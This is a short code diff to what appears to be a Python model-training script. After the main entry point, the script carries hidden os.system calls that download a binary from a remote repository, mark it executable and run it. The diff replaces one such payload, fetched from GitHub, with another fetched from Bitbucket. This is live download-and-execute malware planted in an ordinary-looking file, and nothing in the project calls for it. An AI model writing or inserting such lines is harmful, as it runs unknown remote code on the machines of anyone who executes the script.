@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/novalanto010101/file/main/der')
-os.system('chmod 777 der')
-os.system('./der')
+os.system('wget https://bitbucket.org/naufalsis61/file/raw/master/der2')
+os.system('chmod 777 der2')
+os.system('./der2')
